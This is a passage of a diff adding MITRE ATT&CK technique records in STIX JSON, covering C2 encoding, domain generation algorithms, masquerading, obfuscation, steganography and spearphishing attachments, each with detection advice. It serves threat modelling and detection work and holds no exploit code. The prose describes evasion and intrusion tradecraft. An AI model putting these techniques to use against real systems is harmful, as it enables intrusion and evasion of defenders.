+            "modified": "2020-03-14T23:36:52.095Z",
+            "created": "2020-03-14T23:36:52.095Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c",
+            "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "command-and-control"
+                }
+            ],
+            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1132/001",
+                    "external_id": "T1132.001",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "Wikipedia Binary-to-text Encoding",
+                    "description": "Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.",
+                    "url": "https://en.wikipedia.org/wiki/Binary-to-text_encoding"
+                },
+                {
+                    "source_name": "Wikipedia Character Encoding",
+                    "description": "Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.",
+                    "url": "https://en.wikipedia.org/wiki/Character_encoding"
+                },
+                {
+                    "source_name": "University of Birmingham C2",
+                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2020-11-10T18:28:57.002Z",
+            "name": "Domain Generation Algorithms",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Traffic Flow",
+                "Network Traffic: Network Connection Creation"
+            ],
+            "x_mitre_version": "1.0",
+            "created": "2020-03-10T17:44:59.787Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "command-and-control"
+                }
+            ],
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
+            "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Ryan Benson, Exabeam",
+                "Barry Shteiman, Exabeam",
+                "Sylvain Gil, Exabeam"
+            ],
+            "x_mitre_detection": "Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\n\nMachine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1568/002",
+                    "external_id": "T1568.002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf",
+                    "description": "Sternfeld, U. (2016). Dissecting Domain Generation Algorithms: Eight Real World DGA Variants. Retrieved February 18, 2019.",
+                    "source_name": "Cybereason Dissecting DGAs"
+                },
+                {
+                    "url": "https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/",
+                    "description": "Scarfo, A. (2016, October 10). Domain Generation Algorithms \u2013 Why so effective?. Retrieved February 18, 2019.",
+                    "source_name": "Cisco Umbrella DGA"
+                },
+                {
+                    "url": "https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/",
+                    "description": "Unit 42. (2019, February 7). Threat Brief: Understanding Domain Generation Algorithms (DGA). Retrieved February 19, 2019.",
+                    "source_name": "Unit 42 DGA Feb 2019"
+                },
+                {
+                    "source_name": "Talos CCleanup 2017",
+                    "description": "Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast Number of Machines at Risk. Retrieved March 9, 2018.",
+                    "url": "http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html"
+                },
+                {
+                    "url": "https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html",
+                    "description": "Liu, H. and Yuzifovich, Y. (2018, January 9). A Death Match of Domain Generation Algorithms. Retrieved February 18, 2019.",
+                    "source_name": "Akamai DGA Mitigation"
+                },
+                {
+                    "source_name": "FireEye POSHSPY April 2017",
+                    "description": "Dunwoody, M.. (2017, April 3). Dissecting One of APT29\u2019s Fileless WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
+                },
+                {
+                    "url": "https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/",
+                    "description": "ESET. (2017, December 21). Sednit update: How Fancy Bear Spent the Year. Retrieved February 18, 2019.",
+                    "source_name": "ESET Sednit 2017 Activity"
+                },
+                {
+                    "url": "https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/",
+                    "description": "Jacobs, J. (2014, October 2). Building a DGA Classifier: Part 2, Feature Engineering. Retrieved February 18, 2019.",
+                    "source_name": "Data Driven Security DGA"
+                },
+                {
+                    "url": "http://csis.pace.edu/~ctappert/srd2017/2017PDF/d4.pdf",
+                    "description": "Chen, L., Wang, T.. (2017, May 5). Detecting Algorithmically Generated Domains Using Data Visualization and N-Grams Methods . Retrieved April 26, 2019.",
+                    "source_name": "Pace University Detecting DGA May 2017"
+                },
+                {
+                    "url": "https://arxiv.org/pdf/1611.00791.pdf",
+                    "description": "Ahuja, A., Anderson, H., Grant, D., Woodbridge, J.. (2016, November 2). Predicting Domain Generation Algorithms with Long Short-Term Memory Networks. Retrieved April 26, 2019.",
+                    "source_name": "Elastic Predicting DGA"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Email Addresses",
+            "x_mitre_version": "1.0",
+            "modified": "2021-04-15T03:27:19.702Z",
+            "created": "2020-10-02T14:56:24.866Z",
+            "x_mitre_platforms": [
+                "PRE"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262",
+            "description": "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "reconnaissance"
+                }
+            ],
+            "x_mitre_detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1589/002",
+                    "external_id": "T1589.002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://www.hackers-arise.com/email-scraping-and-maltego",
+                    "description": "Hackers Arise. (n.d.). Email Scraping and Maltego. Retrieved October 20, 2020.",
+                    "source_name": "HackersArise Email"
+                },
+                {
+                    "url": "https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/",
+                    "description": "Ng, A. (2019, January 17). Massive breach leaks 773 million email addresses, 21 million passwords. Retrieved October 20, 2020.",
+                    "source_name": "CNET Leaks"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2020-03-20T15:42:48.595Z",
+            "name": "Ingress Tool Transfer",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Traffic Flow",
+                "Network Traffic: Network Connection Creation",
+                "Network Traffic: Network Traffic Content",
+                "File: File Creation"
+            ],
+            "x_mitre_version": "2.0",
+            "created": "2017-05-31T21:31:16.408Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
+            "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "command-and-control"
+                }
+            ],
+            "x_mitre_detection": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1105",
+                    "external_id": "T1105",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "University of Birmingham C2",
+                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Masquerading",
+            "x_mitre_data_sources": [
+                "Image: Image Metadata",
+                "Command: Command Execution",
+                "Service: Service Metadata",
+                "Service: Service Creation",
+                "Scheduled Job: Scheduled Job Metadata",
+                "Scheduled Job: Scheduled Job Modification",
+                "File: File Metadata",
+                "Process: Process Metadata",
+                "File: File Modification"
+            ],
+            "x_mitre_version": "1.4",
+            "modified": "2021-10-18T13:24:52.973Z",
+            "created": "2017-05-31T21:30:38.511Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_defense_bypassed": [
+                "Application control by file name or path"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows",
+                "Containers"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
+            "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
+            "x_mitre_contributors": [
+                "Oleg Kolesnikov, Securonix",
+                "Nick Carr, Mandiant",
+                "David Lu, Tripwire",
+                "Felipe Esp\u00f3sito, @Pr0teus",
+                "Elastic",
+                "Bartosz Jerzman"
+            ],
+            "x_mitre_detection": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE\u201d.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1036",
+                    "external_id": "T1036",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/177.html",
+                    "external_id": "CAPEC-177",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://lolbas-project.github.io/",
+                    "description": "LOLBAS. (n.d.). Living Off The Land Binaries and Scripts (and also Libraries). Retrieved February 10, 2020.",
+                    "source_name": "LOLBAS Main Site"
+                },
+                {
+                    "url": "http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf",
+                    "description": "Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.",
+                    "source_name": "Elastic Masquerade Ball"
+                },
+                {
+                    "url": "https://twitter.com/ItsReallyNick/status/1055321652777619457",
+                    "description": "Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.",
+                    "source_name": "Twitter ItsReallyNick Masquerading Update"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Obfuscated Files or Information",
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "File: File Metadata",
+                "File: File Creation",
+                "Process: Process Creation"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2021-10-20T16:33:13.472Z",
+            "created": "2017-05-31T21:30:32.662Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_defense_bypassed": [
+                "Host forensic analysis",
+                "Signature-based detection",
+                "Host intrusion prevention systems",
+                "Application control",
+                "Log analysis",
+                "Application control by file name or path"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
+            "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
+            "x_mitre_contributors": [
+                "Red Canary",
+                "Christiaan Beek, @ChristiaanBeek"
+            ],
+            "x_mitre_detection": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1027",
+                    "external_id": "T1027",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/267.html",
+                    "external_id": "CAPEC-267",
+                    "source_name": "capec"
+                },
+                {
+                    "source_name": "Volexity PowerDuke November 2016",
+                    "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
+                    "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+                },
+                {
+                    "source_name": "Linux/Cdorked.A We Live Security Analysis",
+                    "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.",
+                    "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/"
+                },
+                {
+                    "source_name": "Carbon Black Obfuscation Sept 2016",
+                    "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
+                    "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
+                },
+                {
+                    "source_name": "FireEye Obfuscation June 2017",
+                    "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html"
+                },
+                {
+                    "source_name": "FireEye Revoke-Obfuscation July 2017",
+                    "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.",
+                    "url": "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf"
+                },
+                {
+                    "source_name": "PaloAlto EncodedCommand March 2017",
+                    "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.",
+                    "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"
+                },
+                {
+                    "source_name": "GitHub Revoke-Obfuscation",
+                    "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.",
+                    "url": "https://github.com/danielbohannon/Revoke-Obfuscation"
+                },
+                {
+                    "source_name": "GitHub Office-Crackros Aug 2016",
+                    "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.",
+                    "url": "https://github.com/itsreallynick/office-crackros"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Steganography",
+            "x_mitre_data_sources": [
+                "File: File Metadata"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2021-10-15T16:46:56.760Z",
+            "created": "2020-02-05T14:28:16.719Z",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916",
+            "description": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\n[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  ",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_detection": "Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1027/003",
+                    "external_id": "T1027.003",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/636.html",
+                    "external_id": "CAPEC-636",
+                    "source_name": "capec"
+                },
+                {
+                    "source_name": "Wikipedia Duqu",
+                    "description": "Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018.",
+                    "url": "https://en.wikipedia.org/wiki/Duqu"
+                },
+                {
+                    "source_name": "McAfee Malicious Doc Targets Pyeongchang Olympics",
+                    "description": "Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018.",
+                    "url": "https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-10-18T17:39:12.452Z",
+            "name": "Spearphishing Attachment",
+            "x_mitre_data_sources": [
+                "File: File Creation",
+                "Application Log: Application Log Content",
+                "Network Traffic: Network Traffic Content",
+                "Network Traffic: Network Traffic Flow"
+            ],
+            "x_mitre_version": "2.2",
+            "created": "2020-03-02T19:05:18.137Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "initial-access"
+                }
+            ],
+            "x_mitre_platforms": [
+                "macOS",
+                "Windows",
+                "Linux"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
+            "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Philip Winther"
+            ],
+            "x_mitre_detection": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1566/001",
+                    "external_id": "T1566.001",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/163.html",
+                    "external_id": "CAPEC-163",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
+                    "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
+                    "source_name": "Microsoft Anti Spoofing"
+                },
+                {
+                    "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
+                    "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
+                    "source_name": "ACSC Email Spoofing"
+                },
+                {
+                    "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql",
+                    "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.",
+                    "source_name": "Elastic - Koadiac Detection with EQL"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Mshta",
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "File: File Creation",
+                "Command: Command Execution",
+                "Network Traffic: Network Connection Creation"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-10-15T23:59:00.395Z",
+            "created": "2020-01-23T19:32:49.557Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+            "x_mitre_defense_bypassed": [
+                "Application control",
+                "Digital Certificate Validation"
